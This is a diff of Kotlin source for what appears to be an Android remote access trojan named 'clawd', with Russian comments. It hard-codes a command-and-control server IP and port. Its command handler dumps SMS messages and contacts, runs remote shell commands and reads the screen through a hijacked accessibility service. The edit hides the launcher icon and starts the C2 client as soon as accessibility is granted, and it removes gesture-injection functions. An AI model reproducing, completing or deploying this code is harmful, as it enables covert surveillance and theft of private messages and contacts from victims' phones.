@@ -2,21 +2,18 @@ package com.clawd
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
-import android.accessibilityservice.GestureDescription
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import android.graphics.Path
 import android.os.Build
 import android.os.Bundle
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
-import android.widget.Toast
 import androidx.core.app.NotificationCompat
 import java.io.BufferedReader
 import java.io.InputStreamReader
@@ -28,27 +25,11 @@ import java.util.concurrent.LinkedBlockingQueue
 val SERVER_IP = "178.155.5.234"
 val SERVER_PORT = 4444
 
+// Класс MainActivity больше не нужен, так как мы убрали иконку с экрана.
+// Оставим его пустым на всякий случай, чтобы не было ошибок компиляции.
 class MainActivity : android.app.Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        try {
-            // Пытаемся запустить службу
-            startForegroundService(Intent(this, RatForeground::class.java))
-            Toast.makeText(this, "Служба запущена", Toast.LENGTH_SHORT).show()
-        } catch (e: Exception) {
-            // Если вылетает — показываем ошибку на экране
-            val errorMsg = "Ошибка: ${e.message}"
-            Toast.makeText(this, errorMsg, Toast.LENGTH_LONG).show()
-            
-            // И пишем в уведомление, чтобы точно увидеть
-            val notif = NotificationCompat.Builder(this, "err")
-                .setContentTitle("Clawd Error")
-                .setContentText(errorMsg)
-                .setSmallIcon(android.R.drawable.ic_dialog_alert)
-                .build()
-            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            nm.notify(1, notif)
-        }
         finish()
     }
 }
@@ -98,8 +79,6 @@ class C2Client(private val host: String, private val port: Int, private val ctx:
             "sms" -> dumpSms(ctx)
             "contacts" -> dumpContacts(ctx)
             "shell" -> shell(parts.getOrElse(1) { "" })
-            "tap" -> RatAccessibility.instance?.tap(parts[1].toFloat(), parts[2].toFloat())
-            "type" -> RatAccessibility.instance?.typeText(parts.getOrElse(1) { "" })
             "back" -> RatAccessibility.instance?.pressBack()
             "home" -> RatAccessibility.instance?.pressHome()
             "dump" -> RatAccessibility.instance?.dumpScreen()
@@ -119,24 +98,12 @@ class RatAccessibility : AccessibilityService() {
             notificationTimeout = 100
         }
         serviceInfo = info
+        // Запускаем C2-клиент сразу, как только включили доступность
         startForegroundService(Intent(this, RatForeground::class.java))
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
     override fun onInterrupt() {}
-
-    fun tap(x: Float, y: Float) {
-        val path = Path().apply { moveTo(x, y) }
-        val gesture = GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, 50)).build()
-        dispatchGesture(gesture, null, null)
-    }
-
-    fun typeText(text: String) {
-        val root = rootInActiveWindow ?: return
-        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
-        val args = Bundle().apply { putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text) }
-        focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
-    }
 
     fun pressBack() { performGlobalAction(GLOBAL_ACTION_BACK) }
     fun pressHome() { performGlobalAction(GLOBAL_ACTION_HOME) }
